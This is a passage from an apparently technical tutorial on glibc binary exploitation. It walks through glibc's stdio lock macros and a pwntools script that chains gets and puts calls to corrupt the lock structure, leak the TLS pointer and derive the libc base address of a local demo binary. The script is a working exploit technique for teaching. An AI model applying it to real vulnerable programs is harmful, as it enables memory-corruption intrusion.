property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">lock </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> LLL_LOCK_INITIALIZER_LOCKED</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">			      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">owner </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> __self</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression keyword" style="color:#00009f">else</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">owner </span><span class="token macro property expression operator" style="color:#393A34">!=</span><span class="token macro property expression" style="color:#36acaa"> __self</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">					      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression function" style="color:#d73a49">lll_lock</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">lock</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> LLL_PRIVATE</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">				      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">owner </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> __self</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression keyword" style="color:#00009f">else</span><span class="token macro property expression" style="color:#36acaa">								      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression operator" style="color:#393A34">++</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">cnt</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">							      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression keyword" style="color:#00009f">while</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name function" style="color:#d73a49">_IO_lock_unlock</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression keyword" style="color:#00009f">do</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">SINGLE_THREAD_P </span><span class="token macro property expression operator" style="color:#393A34">&amp;&amp;</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">cnt </span><span class="token macro property expression operator" style="color:#393A34">==</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">				      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">owner </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression constant" style="color:#36acaa">NULL</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">lock </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression keyword" style="color:#00009f">else</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression keyword" style="color:#00009f">if</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">cnt </span><span class="token macro property expression operator" style="color:#393A34">==</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression punctuation" style="color:#393A34">{</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">owner </span><span class="token macro property expression operator" style="color:#393A34">=</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression constant" style="color:#36acaa">NULL</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">						      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression function" style="color:#d73a49">lll_unlock</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">lock</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> LLL_PRIVATE</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">				      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa">									      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">    </span><span class="token macro property expression keyword" style="color:#00009f">else</span><span class="token macro property expression" style="color:#36acaa">								      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">      </span><span class="token macro property expression operator" style="color:#393A34">--</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">_name</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token macro property expression punctuation" style="color:#393A34">.</span><span class="token macro property expression" style="color:#36acaa">cnt</span><span class="token macro property expression punctuation" style="color:#393A34">;</span><span class="token macro property expression" style="color:#36acaa">							      </span><span class="token macro property punctuation" style="color:#393A34">\</span><span class="token macro property" style="color:#36acaa"></span><br></span><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">  </span><span class="token macro property expression punctuation" style="color:#393A34">}</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression keyword" style="color:#00009f">while</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Bit more complicated now, but the main takeaways are:</p>
<ul>
<li>The inclusion of <code>SINGLE_THREAD_P</code></li>
<li><code>cnt</code> is only decremented if <code>cnt != 0</code></li>
</ul>
<p>Seems now that <code>cnt = 0</code> doesn&#x27;t necessarily imply that the lock isn&#x27;t being used, but rather not being used by 2+ instances.</p>
<p>This forces us to adjust our techniques slightly, especially for leaking libc (the controlling of <code>rdi</code>, in its current state anyway hasn&#x27;t been affected). This is because we can no longer cause an integer underflow to eliminate the terminating null byte, as it refuses to decrement <code>cnt=0</code>.</p>
<p>Fortunately there is a way around this, but it will require an extra call to <code>gets</code>.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">e </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;demo&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;libc&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x20</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># saved rbp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gets</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gets</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">puts</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;ROP me if you can!\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;B&quot;</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;CCCC&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tls </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> u64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;tls: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">hex</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">tls</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> tls </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x28c0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;libc: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">hex</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">libc</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">address</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>So what&#x27;s going on here?</p>
<p>The main aim of the first <code>gets</code> is to do the following:</p>
<ol>
<li>
<p>Set <code>lock = 0</code>, which marks the lock as <a href="https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/lowlevellock.h#L170" target="_blank" rel="noopener noreferrer">unlocked</a><em>.</em></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">/* Initializers for lock.  */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name" style="color:#36acaa">LLL_LOCK_INITIALIZER</span><span class="token macro property" style="color:#36acaa">		</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression number" style="color:#36acaa">0</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name" style="color:#36acaa">LLL_LOCK_INITIALIZER_LOCKED</span><span class="token macro property" style="color:#36acaa">	</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression number" style="color:#36acaa">1</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
</li>
<li>
<p>Fill <code>cnt</code> with junk.</p>
</li>
<li>
<p>Clobber <code>owner</code> so that <code>owner != THREAD_SELF</code></p>
</li>
</ol>
<p>Then on the last call to <code>gets</code>, when <code>_IO_lock_lock</code> is executed:</p>
<ol>
<li>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">SINGLE_THREAD_P </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">owner </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>This check will <strong>fail</strong>, even if the process is single-threaded, because we set <code>owner</code> to junk, so <code>owner != NULL</code>. You could do a version where this case passes if you wanted, I decided to make the technique not reliant on it being single-threaded (i.e. more versatile).</p>
</li>
<li>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">owner </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> __self</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>This check will <strong>succeed</strong>.</p>
</li>
<li>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">lll_lock</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">lock</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> LLL_PRIVATE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>Unforunately this is unavoidable, but since we set <code>lock = 0</code>, this lock is marked as <strong>unlocked</strong>, so this will just lock it (set <code>lock = 1</code>).</p>
</li>
<li>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">owner </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> __self</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>Bingo! The <code>owner</code> gets set to the <code>TLS</code> structure, which is what we want to leak</p>
</li>
</ol>
<p>Since <code>lock = 1</code>, it contains null bytes which would terminate <code>puts</code>, so here we need to fill <code>lock</code> with junk (<code>&quot;CCCC&quot;</code>). But what about the null byte from <code>gets</code>? Just like before, the <code>cnt</code> getting decremented in unlocking will help to eliminate this null byte.</p>
